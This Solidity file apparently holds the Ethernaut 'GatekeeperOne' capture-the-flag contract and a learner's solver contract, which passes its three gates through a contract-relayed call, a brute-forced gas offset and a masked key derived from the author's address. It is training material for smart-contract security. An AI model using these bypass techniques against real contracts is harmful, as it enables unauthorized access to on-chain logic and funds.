
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}



contract AttackGatekeeperOne {

    GatekeeperOne gatekeeperOneContract;

    constructor(address _gatekeeperOneAddress){
        gatekeeperOneContract = GatekeeperOne(_gatekeeperOneAddress);
    }
  
  // helpful video to solve this challenge: https://www.youtube.com/watch?v=AUQxXJiqLF4&list=LL&index=1&t


  //reducing my public address from 32 bytes into 8 bytes 
  // => my address 0x895aA6B33D403F2727F75E79 aB7a66Fbc1226459 
  // to new => 0xaB7a66Fbc1226459

  bytes8 txOrigin16 = 0xaB7a66Fbc1226459;

  // Used for gate 3
  bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

  // Used for gate 2
  function letMeIn() public{
    for(uint256 i = 0; i < 120; i++){
      // using this address to send tx to pass gate 1
      // where is the 150 coming from??
      (bool result, bytes memory data) = address(gatekeeperOneContract).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key));
      if(result)
      {break;}
    }
  }

}   
